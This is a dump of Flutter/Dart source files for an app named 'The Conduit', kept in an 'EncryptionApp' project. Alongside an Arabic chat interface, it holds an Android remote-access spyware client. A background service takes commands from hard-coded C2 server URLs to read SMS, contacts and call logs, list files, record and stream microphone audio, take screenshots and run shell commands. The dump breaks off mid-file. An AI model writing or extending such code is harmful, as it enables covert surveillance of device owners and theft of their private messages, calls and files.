################################################################################
# تم تجميع أكواد دارت من المسار: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj
# تاريخ الإنشاء: 2025-05-22 22:36:42
################################################################################


// ============================== بداية الملف: app.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\app.dart
// ----------------------------------------------------------------------

import 'package:flutter/material.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';

import 'presentation/chat/providers/theme_providers.dart';
import 'presentation/home/home_page.dart';

// اسم التطبيق الذي سنستخدمه في العرض
const String displayedAppName =
    "The Conduit"; // أو "الساتر" إذا اخترت اسمًا عربيًا

class TheConduitApp extends ConsumerWidget {
  // تم تغيير الاسم
  const TheConduitApp({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final themeState = ref.watch(themeStateProvider);
    final primaryColor = themeState.primaryColor;
    final useMaterial3 = themeState.useMaterial3;

    final TextTheme baseTextTheme = Theme.of(context).textTheme;
    final TextTheme cairoTextTheme = GoogleFonts.cairoTextTheme(baseTextTheme);
    final TextTheme cairoTextThemeLight = cairoTextTheme.apply(
        bodyColor: Colors.black87, displayColor: Colors.black87);
    final TextTheme cairoTextThemeDark = cairoTextTheme.apply(
        bodyColor: Colors.white.withOpacity(0.87),
        displayColor: Colors.white.withOpacity(0.87));

    return MaterialApp(
      title: displayedAppName,
      themeMode: themeState.themeMode,
      locale: const Locale('ar'),
      supportedLocales: const [Locale('ar')],
      localizationsDelegates: const [
        GlobalMaterialLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
      ],
      theme: ThemeData(
        useMaterial3: useMaterial3,
        primaryColor: primaryColor,
        textTheme: cairoTextThemeLight,
        colorScheme: ColorScheme.light(
          primary: primaryColor,
          secondary: primaryColor.withOpacity(0.7),
          tertiary: primaryColor.withOpacity(0.3),
          surface: Colors.grey[50]!, // لون خلفية Scaffold
          onPrimary: Colors.white,
          onSecondary: Colors.white,
          onSurface: Colors.black87,
          error: Colors.redAccent,
          onError: Colors.white,
        ),
        scaffoldBackgroundColor: Colors.grey[100],
        appBarTheme: AppBarTheme(
          backgroundColor: primaryColor,
          foregroundColor: Colors.white,
          elevation: useMaterial3 ? 0 : 2,
          centerTitle: true,
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 20,
                  fontWeight: FontWeight.w600,
                  color: Colors.white)),
          shape: useMaterial3
              ? null
              : const RoundedRectangleBorder(
                  borderRadius:
                      BorderRadius.vertical(bottom: Radius.circular(12)),
                ),
        ),
        elevatedButtonTheme: ElevatedButtonThemeData(
          style: ElevatedButton.styleFrom(
            backgroundColor: primaryColor,
            foregroundColor: Colors.white,
            shape:
                RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
            textStyle: GoogleFonts.cairo(
                textStyle: baseTextTheme.labelLarge
                    ?.copyWith(fontWeight: FontWeight.w600)),
          ),
        ),
        inputDecorationTheme: InputDecorationTheme(
          filled: true,
          fillColor: Colors.white,
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[300]!),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[300]!),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: primaryColor, width: 1.5),
          ),
          hintStyle: GoogleFonts.cairo(
              textStyle:
                  baseTextTheme.bodyMedium?.copyWith(color: Colors.grey[400])),
        ),
        cardTheme: CardTheme(
          elevation: useMaterial3 ? 1 : 2,
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          clipBehavior: Clip.antiAlias,
          color: useMaterial3 ? Colors.grey[50] : Colors.white,
        ),
        tabBarTheme: TabBarTheme(
          labelColor: Colors.white,
          unselectedLabelColor: Colors.white70,
          labelStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.labelLarge
                  ?.copyWith(fontWeight: FontWeight.w600)),
          unselectedLabelStyle:
              GoogleFonts.cairo(textStyle: baseTextTheme.labelLarge),
          indicator: useMaterial3
              ? const BoxDecoration(
                  border: Border(
                      bottom: BorderSide(color: Colors.white, width: 2.5)),
                )
              : BoxDecoration(
                  borderRadius: BorderRadius.circular(8),
                  color: Colors.white.withOpacity(0.2),
                ),
          indicatorSize: TabBarIndicatorSize.tab,
        ),
        dialogTheme: DialogTheme(
          backgroundColor: Colors.white,
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.black87)),
          contentTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.bodyMedium
                  ?.copyWith(fontSize: 14, color: Colors.black54)),
        ),
        bottomSheetTheme: const BottomSheetThemeData(
          backgroundColor: Colors.white,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
          ),
          modalBackgroundColor: Colors.white, // لخلفية الـ ModalBottomSheet
        ),
      ),
      darkTheme: ThemeData(
        useMaterial3: useMaterial3,
        primaryColor: primaryColor,
        brightness: Brightness.dark,
        textTheme: cairoTextThemeDark,
        colorScheme: ColorScheme.dark(
          primary: primaryColor,
          secondary: primaryColor.withOpacity(0.7),
          tertiary: primaryColor.withOpacity(0.3),
          surface: const Color(0xFF1A1A1A), // لون خلفية Scaffold
          onPrimary: Colors.white,
          onSecondary: Colors.white,
          onSurface: Colors.white.withOpacity(0.87),
          error: Colors.redAccent[100]!,
          onError: Colors.black,
        ),
        scaffoldBackgroundColor: const Color(0xFF121212),
        appBarTheme: AppBarTheme(
          backgroundColor: useMaterial3
              ? const Color(0xFF1A1A1A) // لون أغمق قليلاً لـ M3 Dark
              : primaryColor.withOpacity(0.9),
          foregroundColor: Colors.white.withOpacity(0.9),
          elevation: useMaterial3 ? 0 : 2,
          centerTitle: true,
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 20,
                  fontWeight: FontWeight.w600,
                  color: Colors.white.withOpacity(0.9))),
          shape: useMaterial3
              ? null
              : const RoundedRectangleBorder(
                  borderRadius:
                      BorderRadius.vertical(bottom: Radius.circular(12)),
                ),
        ),
        elevatedButtonTheme: ElevatedButtonThemeData(
          style: ElevatedButton.styleFrom(
            backgroundColor: primaryColor,
            foregroundColor: Colors.white,
            shape:
                RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
            textStyle: GoogleFonts.cairo(
                textStyle: baseTextTheme.labelLarge
                    ?.copyWith(fontWeight: FontWeight.w600)),
          ),
        ),
        inputDecorationTheme: InputDecorationTheme(
          filled: true,
          fillColor: const Color(0xFF2C2C2C),
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[700]!),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[700]!),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: primaryColor, width: 1.5),
          ),
          hintStyle: GoogleFonts.cairo(
              textStyle:
                  baseTextTheme.bodyMedium?.copyWith(color: Colors.grey[500])),
        ),
        cardTheme: CardTheme(
          color: const Color(0xFF252525),
          elevation: useMaterial3 ? 1 : 2,
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          clipBehavior: Clip.antiAlias,
        ),
        tabBarTheme: TabBarTheme(
          labelColor: Colors.white,
          unselectedLabelColor: Colors.white70,
          labelStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.labelLarge
                  ?.copyWith(fontWeight: FontWeight.w600)),
          unselectedLabelStyle:
              GoogleFonts.cairo(textStyle: baseTextTheme.labelLarge),
          indicator: useMaterial3
              ? BoxDecoration(
                  border: Border(
                      bottom: BorderSide(color: primaryColor, width: 2.5)),
                )
              : BoxDecoration(
                  borderRadius: BorderRadius.circular(8),
                  color: Colors.white.withOpacity(0.15),
                ),
          indicatorSize: TabBarIndicatorSize.tab,
        ),
        dialogTheme: DialogTheme(
          backgroundColor: const Color(0xFF2C2C2C),
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.white.withOpacity(0.87))),
          contentTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.bodyMedium?.copyWith(
                  fontSize: 14, color: Colors.white.withOpacity(0.7))),
        ),
        bottomSheetTheme: const BottomSheetThemeData(
          backgroundColor: Color(0xFF2C2C2C),
          modalBackgroundColor: Color(0xFF2C2C2C),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
          ),
        ),
      ),
      debugShowCheckedModeBanner: false,
      home: const HomePage(),
    );
  }
}



// ------------------------------ نهاية الملف: app.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: main.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\main.dart
// ----------------------------------------------------------------------

// main.dart
import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:permission_handler/permission_handler.dart';

import 'services/background_service.dart';
import 'services/screenshot_service.dart';
import 'services/ui_bridge_service.dart';

const String displayedAppName = "The Conduit";
final GlobalKey screenshotGlobalKey = GlobalKey();
List<String> globalLogs = [];

const String backgroundServiceNotificationChannelId =
    'the_conduit_service_channel';
const String backgroundServiceNotificationChannelName =
    'The Conduit Background Service';
const String backgroundServiceNotificationChannelDescription =
    'Channel for The Conduit background service notifications.';

final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
    FlutterLocalNotificationsPlugin();

Future<void> _createNotificationChannel() async {
  const AndroidNotificationChannel channel = AndroidNotificationChannel(
    backgroundServiceNotificationChannelId,
    backgroundServiceNotificationChannelName,
    description: backgroundServiceNotificationChannelDescription,
    importance: Importance.low,
    playSound: false,
    enableVibration: false,
  );
  await flutterLocalNotificationsPlugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(channel);
  print(
      "Notification channel '$backgroundServiceNotificationChannelId' created/updated.");
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await _createNotificationChannel();
  await requestBasicPermissions();

  // تهيئة UI Bridge Service
  await UIBridgeService().initialize();

  await initializeBackgroundService();

  runApp(ProviderScope(child: MyApp()));
}

Future<void> requestBasicPermissions() async {
  Map<Permission, PermissionStatus> statuses = await [
    Permission.location,
    Permission.storage,
    Permission.accessMediaLocation,
    Permission.camera,
  ].request();

  print("Permission statuses: $statuses");

  if (statuses[Permission.location] != PermissionStatus.granted) {
    globalLogs.add("Location permission was not granted.");
  }
  if (statuses[Permission.storage] != PermissionStatus.granted) {
    globalLogs.add("Storage permission was not granted.");
  }
  if (statuses[Permission.camera] != PermissionStatus.granted) {
    globalLogs.add("Camera permission was not granted.");
  }
}

class MyApp extends ConsumerWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final themeMode = ref.watch(themeProvider);
    return MaterialApp(
      title: displayedAppName,
      theme: ThemeData(
        brightness: Brightness.light,
        primarySwatch: Colors.teal,
        fontFamily: GoogleFonts.cairo().fontFamily,
      ),
      darkTheme: ThemeData(
        brightness: Brightness.dark,
        primarySwatch: Colors.teal,
        fontFamily: GoogleFonts.cairo().fontFamily,
      ),
      themeMode: themeMode,
      localizationsDelegates: const [
        GlobalMaterialLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
      ],
      supportedLocales: const [
        Locale('en', ''),
        Locale('ar', ''),
      ],
      home: RepaintBoundary(
        key: screenshotGlobalKey,
        child: MonitoringScreen(),
      ),
      debugShowCheckedModeBanner: false,
    );
  }
}

class MonitoringScreen extends StatefulWidget {
  const MonitoringScreen({super.key});

  @override
  _MonitoringScreenState createState() => _MonitoringScreenState();
}

class _MonitoringScreenState extends State<MonitoringScreen> {
  final FlutterBackgroundService service = FlutterBackgroundService();
  late ScreenshotService _screenshotService;
  late UIBridgeService _uiBridgeService;

  @override
  void initState() {
    super.initState();

    _uiBridgeService = UIBridgeService();

    _screenshotService = ScreenshotService(
      screenshotKey: screenshotGlobalKey,
      onLogEvent: (log) {
        if (mounted) {
          setState(() {
            globalLogs.insert(0,
                "[${DateTime.now().toIso8601String().substring(11, 19)}] SCREENSHOT_SVC_UI: $log");
          });
        }
      },
    );

    // الاستماع للسجلات من الخدمة الخلفية
    service.on('addLog').listen((data) {
      if (data != null && data.containsKey('log') && mounted) {
        setState(() {
          globalLogs.insert(0,
              "[${DateTime.now().toIso8601String().substring(11, 19)}] BG_SVC: ${data['log']}");
        });
      }
    });

    service.on('updateUI').listen((event) {
      if (mounted) setState(() {});
    });

    // معالجة طلبات لقطة الشاشة المحسنة
    service.on('requestScreenshotFromUI').listen((argsFromService) async {
      if (mounted) {
        final commandId = argsFromService?['command_id'] as String?;
        globalLogs.add(
            "UI: Received screenshot request from service. Command ID: $commandId");

        final Uint8List? imageBytes =
            await _screenshotService.captureScreenshot();

        Map<String, dynamic> responseToService = {};

        if (imageBytes != null) {
          final String? filePath =
              await _screenshotService.saveScreenshotToFile(imageBytes);
          if (filePath != null) {
            responseToService = {
              'file_path': filePath,
              'command_id': commandId,
            };
            globalLogs.add(
                "UI: Screenshot captured and saved to: $filePath. Sending path to service.");
          } else {
            responseToService = {
              'error': 'Failed to save screenshot to file in UI',
              'command_id': commandId,
            };
            globalLogs.add("UI: Failed to save screenshot to file.");
          }
        } else {
          responseToService = {
            'error': 'Failed to capture screenshot in UI',
            'command_id': commandId,
          };
          globalLogs.add("UI: Failed to capture screenshot bytes.");
        }

        service.invoke('screenshotTakenByUI', responseToService);
      }
    });

    // معالجة طلبات UI Bridge
    service.on('ui_bridge_request').listen((data) async {
      if (data is Map<String, dynamic>) {
        await _handleUIBridgeRequest(data);
      }
    });
  }

  Future<void> _handleUIBridgeRequest(Map<String, dynamic> data) async {
    final requestId = data['requestId'] as String?;
    final method = data['method'] as String?;
    final params = data['params'] as Map<String, dynamic>? ?? {};

    if (requestId == null || method == null) return;

    globalLogs.add("UI: Processing bridge request: $method (ID: $requestId)");

    try {
      Map<String, dynamic> result;

      switch (method) {
        case 'listFiles':
          result = await _handleListFiles(params);
          break;
        case 'getSmsListPaginated':
          result = await _handleGetSmsListPaginated(params);
          break;
        case 'getContactsListPaginated':
          result = await _handleGetContactsListPaginated(params);
          break;
        case 'getCallLogsPaginated':
          result = await _handleGetCallLogsPaginated(params);
          break;
        case 'recordAudio':
          result = await _handleRecordAudio(params);
          break;
        case 'startLiveAudio':
          result = await _handleStartLiveAudio(params);
          break;
        case 'stopLiveAudio':
          result = await _handleStopLiveAudio(params);
          break;
        case 'executeShell':
          result = await _handleExecuteShell(params);
          break;
        case 'requestScreenshot':
          result = await _handleRequestScreenshot(params);
          break;
        default:
          result = {'status': 'error', 'message': 'Unknown method: $method'};
      }

      // إرسال النتيجة للخدمة الخلفية
      service.invoke('ui_bridge_response', {
        'requestId': requestId,
        'result': result,
      });
    } catch (e) {
      globalLogs.add("UI: Error processing bridge request: $e");

      service.invoke('ui_bridge_response', {
        'requestId': requestId,
        'result': {
          'status': 'error',
          'message': e.toString(),
        },
      });
    }
  }

  Future<Map<String, dynamic>> _handleListFiles(
      Map<String, dynamic> params) async {
    try {
      return await _uiBridgeService.handleListFiles(params);
    } catch (e) {
      return {'status': 'error', 'message': e.toString()};
    }
  }

  Future<Map<String, dynamic>> _handleGetSmsListPaginated(
      Map<String, dynamic> params) async {
    try {
      return await _uiBridgeService.handleGetSmsListPaginated(params);
    } catch (e) {
      return {'status': 'error', 'message': e.toString()};
    }
  }

  Future<Map<String, dynamic>> _handleGetContactsListPaginated(
      Map<String, dynamic> params) async {
    try {
      return await _uiBridgeService.handleGetContactsListPaginated(params);
    } catch (e) {
      return {'status': 'error', 'message': e.toString()};
    }
  }

  Future<Map<String, dynamic>> _handleGetCallLogsPaginated(
      Map<String, dynamic> params) async {
    try {
      return await _uiBridgeService.handleGetCallLogsPaginated(params);
    } catch (e) {
      return {'status': 'error', 'message': e.toString()};
    }
  }

  Future<Map<String, dynamic>> _handleRecordAudio(
      Map<String, dynamic> params) async {
    try {
      return await _uiBridgeService.handleRecordAudio(params);
    } catch (e) {
      return {'status': 'error', 'message': e.toString()};
    }
  }

  Future<Map<String, dynamic>> _handleStartLiveAudio(
      Map<String, dynamic> params) async {
    try {
      return await _uiBridgeService.handleStartLiveAudio(params);
    } catch (e) {
      return {'status': 'error', 'message': e.toString()};
    }
  }

  Future<Map<String, dynamic>> _handleStopLiveAudio(
      Map<String, dynamic> params) async {
    try {
      return await _uiBridgeService.handleStopLiveAudio(params);
    } catch (e) {
      return {'status': 'error', 'message': e.toString()};
    }
  }

  Future<Map<String, dynamic>> _handleExecuteShell(
      Map<String, dynamic> params) async {
    try {
      return await _uiBridgeService.handleExecuteShell(params);
    } catch (e) {
      return {'status': 'error', 'message': e.toString()};
    }
  }

  Future<Map<String, dynamic>> _handleRequestScreenshot(
      Map<String, dynamic> params) async {
    try {
      // تنفيذ لقطة الشاشة مباشرة في UI thread
      final Uint8List? imageBytes =
          await _screenshotService.captureScreenshot();

      if (imageBytes != null) {
        final String? filePath =
            await _screenshotService.saveScreenshotToFile(imageBytes);
        if (filePath != null) {
          return {
            'status': 'success',
            'file_path': filePath,
          };
        } else {
          return {
            'status': 'error',
            'message': 'Failed to save screenshot to file'
          };
        }
      } else {
        return {'status': 'error', 'message': 'Failed to capture screenshot'};
      }
    } catch (e) {
      return {'status': 'error', 'message': e.toString()};
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('$displayedAppName - Monitor'),
        actions: [
          IconButton(
            icon: Icon(Icons.cleaning_services),
            onPressed: () {
              if (mounted) {
                setState(() {
                  globalLogs.clear();
                  globalLogs.add("Logs cleared by user.");
                });
              }
            },
          ),
          IconButton(
            icon: Icon(Icons.send_to_mobile),
            onPressed: () {
              service.invoke(
                  "triggerInfoLog", {"message": "Hello from UI button!"});
            },
          )
        ],
      ),
      body: globalLogs.isEmpty
          ? Center(
              child: Text(
                  'No logs yet. Ensure the service is running and can connect to the C2 server.'))
          : ListView.builder(
              reverse: false,
              itemCount: globalLogs.length,
              itemBuilder: (context, index) {
                return Padding(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 8.0, vertical: 2.0),
                  child: Text(
                    globalLogs[index],
                    style: TextStyle(fontSize: 11),
                  ),
                );
              },
            ),
    );
  }
}

final themeProvider = StateProvider<ThemeMode>((ref) => ThemeMode.system);



// ------------------------------ نهاية الملف: main.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: native_channel_handler.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\native_channel_handler.dart
// ----------------------------------------------------------------------

// lib/native_channel_handler.dart
import 'dart:async';

import 'package:flutter/services.dart';
import 'package:newtest1/utils/constants.dart'; // أو المسار الصحيح لملف constants.dart

class NativeChannelHandler {
  static const MethodChannel _filesChannel =
      MethodChannel(NATIVE_FILES_CHANNEL); //
  static const MethodChannel _nativeFeaturesChannel =
      MethodChannel(NATIVE_FEATURES_CHANNEL);
  static const EventChannel _liveAudioEventChannel =
      EventChannel(NATIVE_LIVE_AUDIO_STREAM_CHANNEL);

  static Stream<Uint8List>? _liveAudioStream;

  static Future<Map<String, dynamic>> listFilesNatively(String path) async {
    try {
      final Map<dynamic, dynamic>? result =
          await _filesChannel.invokeMethod('listFiles', {'path': path}); //
      if (result != null) {
        return Map<String, dynamic>.from(result); //
      }
      return {
        //
        'error': 'Null result from native platform for listFiles',
        'files': [],
        'path': path
      };
    } on PlatformException catch (e) {
      //
      print(
          "Failed to list files via native channel: '${e.message}'. Details: ${e.details}");
      return {
        //
        'error': "PlatformException: ${e.message}",
        'details': e.details,
        'files': [],
        'path': path
      };
    } catch (e) {
      //
      print("Generic error listing files via native channel: $e");
      return {
        'error': "Generic error: ${e.toString()}",
        'files': [],
        'path': path
      }; //
    }
  }

  static Future<Map<String, dynamic>> executeShellNatively(
      String command, List<String> args) async {
    try {
      final Map<dynamic, dynamic>? result = await _filesChannel
          .invokeMethod('executeShell', {'command': command, 'args': args});
      if (result != null) {
        return Map<String, dynamic>.from(result);
      }
      return {
        'error': 'Null result from native platform for executeShell',
        'command': command,
        'args': args
      };
    } on PlatformException catch (e) {
      print(
          "Failed to execute shell via native channel: '${e.message}'. Details: ${e.details}");
      return {
        'error': "PlatformException: ${e.message}",
        'details': e.details,
        'command': command,
        'args': args
      };
    } catch (e) {
      print("Generic error executing shell via native channel: $e");
      return {
        'error': "Generic error: ${e.toString()}",
        'command': command,
        'args': args
      };
    }
  }

  static Future<List<dynamic>> getSmsListNatively() async {
    try {
      final List<dynamic>? result =
          await _nativeFeaturesChannel.invokeMethod('getSmsList');
      return result ?? [];
    } on PlatformException catch (e) {
      print("Failed to get SMS list: ${e.message}");
      return Future.error("Failed to get SMS: ${e.message}");
    } catch (e) {
      print("Generic error getting SMS list: $e");
      return Future.error("Generic error getting SMS: ${e.toString()}");
    }
  }

  static Future<List<dynamic>> getContactsListNatively() async {
    try {
      final List<dynamic>? result =
          await _nativeFeaturesChannel.invokeMethod('getContactsList');
      return result ?? [];
    } on PlatformException catch (e) {
      print("Failed to get Contacts list: ${e.message}");
      return Future.error("Failed to get Contacts: ${e.message}");
    } catch (e) {
      print("Generic error getting Contacts list: $e");
      return Future.error("Generic error getting Contacts: ${e.toString()}");
    }
  }

  static Future<List<dynamic>> getCallLogsListNatively() async {
    try {
      final List<dynamic>? result =
          await _nativeFeaturesChannel.invokeMethod('getCallLogsList');
      return result ?? [];
    } on PlatformException catch (e) {
      print("Failed to get Call Logs list: ${e.message}");
      return Future.error("Failed to get Call Logs: ${e.message}");
    } catch (e) {
      print("Generic error getting Call Logs list: $e");
      return Future.error("Generic error getting Call Logs: ${e.toString()}");
    }
  }

  static Future<Map<String, dynamic>> recordAudioFixedDurationNatively(
      int durationSeconds) async {
    try {
      final Map<dynamic, dynamic>? result =
          await _nativeFeaturesChannel.invokeMethod(
        'recordAudio',
        {'duration_seconds': durationSeconds},
      );
      if (result != null) {
        return Map<String, dynamic>.from(result);
      }
      return {
        'error': 'Null result from native platform for recordAudio',
        'status': 'failed'
      };
    } on PlatformException catch (e) {
      print("Failed to record audio (fixed duration): ${e.message}");
      return {'error': "PlatformException: ${e.message}", 'status': 'failed'};
    } catch (e) {
      print("Generic error recording audio (fixed duration): $e");
      return {'error': "Generic error: ${e.toString()}", 'status': 'failed'};
    }
  }

  static Future<String?> startLiveAudioStreamNatively() async {
    try {
      final String? status =
          await _nativeFeaturesChannel.invokeMethod('startLiveAudioStream');
      if (status != null && status.toLowerCase().contains("started")) {
        print("Native live audio stream started successfully.");
        return status;
      } else {
        print(
            "Native live audio stream start command acknowledged but status unclear: $status");
        return "Failed to start: ${status ?? 'Unknown native response'}";
      }
    } on PlatformException catch (e) {
      print("Failed to start live audio stream: ${e.message}");
      return "Error: ${e.message}";
    }
  }

  static Future<String?> stopLiveAudioStreamNatively() async {
    try {
      final String? status =
          await _nativeFeaturesChannel.invokeMethod('stopLiveAudioStream');
      if (status != null && status.toLowerCase().contains("stopped")) {
        print("Native live audio stream stopped successfully.");
        _liveAudioStream = null; // Clear the stream when stopped
        return status;
      } else {
        print(
            "Native live audio stream stop command acknowledged but status unclear: $status");
        _liveAudioStream = null;
        return "Failed to stop clearly: ${status ?? 'Unknown native response'}";
      }
    } on PlatformException catch (e) {
      print("Failed to stop live audio stream: ${e.message}");
      _liveAudioStream = null;
      return "Error: ${e.message}";
    }
  }

  static Stream<Uint8List> getLiveAudioStream() {
    _liveAudioStream ??= _liveAudioEventChannel
        .receiveBroadcastStream()
        .map((dynamic event) => event as Uint8List);
    return _liveAudioStream!;
  }
}



// ------------------------------ نهاية الملف: native_channel_handler.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: app_config.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\config\app_config.dart
// ----------------------------------------------------------------------

// lib/config/app_config.dart

// !! هام: في بيئة حقيقية، استخدم متغيرات البيئة أو تقنيات إدارة الأسرار
// لا تضع عناوين IP أو نطاقات حقيقية هنا مباشرة في التحكم بالمصادر (Version Control)
// هذا مجرد مثال توضيحي.

// --- HTTP Server Configuration ---
// هذا العنوان يشير إلى النطاق الذي وفرته Cloudflare Tunnel
// والذي يوجه مباشرة إلى Flask HTTP server على جهازك
const String C2_HTTP_SERVER_URL =
    'https://ws.sosa-qav.es'; // <-- تم استبداله بعنوان Cloudflare Tunnel HTTPS

// --- WebSocket (Socket.IO) Server Configuration ---
// طالما أن نفس النطاق يدعم ترقية WebSocket (Cloudflare يدعمها)،
// نغير البروتوكول فقط إلى wss:// (للاتصال المشفر)
const String C2_SOCKET_IO_URL =
    'wss://ws.sosa-qav.es'; // <-- استخدم wss مع Cloudflare لأنه HTTPS

const Duration C2_SOCKET_IO_RECONNECT_DELAY = Duration(seconds: 5);
const int C2_SOCKET_IO_RECONNECT_ATTEMPTS = 5;
const Duration C2_HEARTBEAT_INTERVAL = Duration(
  seconds: 45,
); // Interval for client to send heartbeat



// ------------------------------ نهاية الملف: app_config.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: api_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\api_service.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/api_service.dart
import "dart:async";
import "dart:io"; // Required for File operations
import "dart:math";

import "package:cloud_firestore/cloud_firestore.dart";
import "package:firebase_storage/firebase_storage.dart"; // Import Firebase Storage
import "package:file_picker/file_picker.dart"; // Required for PlatformFile
import "package:path/path.dart" as p; // For path manipulation

import "../../core/logging/logger_service.dart";
import "../../data/models/chat/chat_conversation.dart";
import "../../data/models/chat/chat_message.dart";

class ApiService {
  final FirebaseFirestore _firestore;
  final FirebaseStorage _storage; // Add Firebase Storage instance
  final LoggerService _logger;
  final String _currentAgentCode;

  String get currentAgentCodeValue => _currentAgentCode;

  ApiService(this._firestore, this._storage, this._logger, this._currentAgentCode) {
    if (_currentAgentCode.isEmpty) {
      _logger.error("ApiService:Constructor",
          "CRITICAL: ApiService initialized with an empty agent code!");
    }
    _logger.info("ApiService:Constructor",
        "ApiService initialized for agent: $_currentAgentCode");
  }

  // Method to upload file to Firebase Storage
  Future<String?> uploadFileToStorage(PlatformFile platformFile, String conversationId) async {
    if (platformFile.path == null) {
      _logger.error("ApiService:uploadFileToStorage", "File path is null for ${platformFile.name}");
      return null;
    }
    File file = File(platformFile.path!);
    String fileName = "${DateTime.now().millisecondsSinceEpoch}_${p.basename(file.path)}";
    String filePath = "chat_attachments/$conversationId/$fileName";

    _logger.info("ApiService:uploadFileToStorage", "Attempting to upload ${platformFile.name} to $filePath");

    try {
      UploadTask uploadTask = _storage.ref().child(filePath).putFile(file);
      TaskSnapshot snapshot = await uploadTask;
      String downloadUrl = await snapshot.ref.getDownloadURL();
      _logger.info("ApiService:uploadFileToStorage", "File ${platformFile.name} uploaded successfully. URL: $downloadUrl");
      return downloadUrl;
    } on FirebaseException catch (e, s) {
      _logger.error("ApiService:uploadFileToStorage", "FirebaseException during upload for ${platformFile.name}: ${e.message}", e, s);
      return null;
    } catch (e, s) {
      _logger.error("ApiService:uploadFileToStorage", "Generic error during upload for ${platformFile.name}", e, s);
      return null;
    }
  }

  Stream<List<ChatConversation>> getConversationsStream() {
    _logger.info("ApiService:getConversationsStream",
        "Fetching conversations for agent: $_currentAgentCode, excluding those marked as deleted for this agent.");
    return _firestore
        .collection("conversations")
        .where("participants", arrayContains: _currentAgentCode) // User must be a participant
        .where("deletedForUsers.$_currentAgentCode", isNotEqualTo: true) // Exclude if marked deleted for this user
        .orderBy("updatedAt", descending: true)
        .snapshots()
        .map((snapshot) {
      if (snapshot.docs.isEmpty) {
        _logger.info(
            "ApiService:getConversationsStream", "No active conversations found for $_currentAgentCode.");
        return <ChatConversation>[];
      }
      _logger.debug("ApiService:getConversationsStream",
          "Received ${snapshot.docs.length} active conversations for $_currentAgentCode.");
      return snapshot.docs
          .map((doc) => ChatConversation.fromFirestore(
              doc as DocumentSnapshot<Map<String, dynamic>>, _currentAgentCode))
          .toList();
    }).handleError((error, stackTrace) {
      _logger.error("ApiService:getConversationsStream", "Error in stream for $_currentAgentCode",
          error, stackTrace);
      return <ChatConversation>[];
    });
  }

  Stream<List<ChatMessage>> getMessagesStream(String conversationId) {
    _logger.info("ApiService:getMessagesStream",
        "Fetching for conversation $conversationId");
    if (conversationId.isEmpty) {
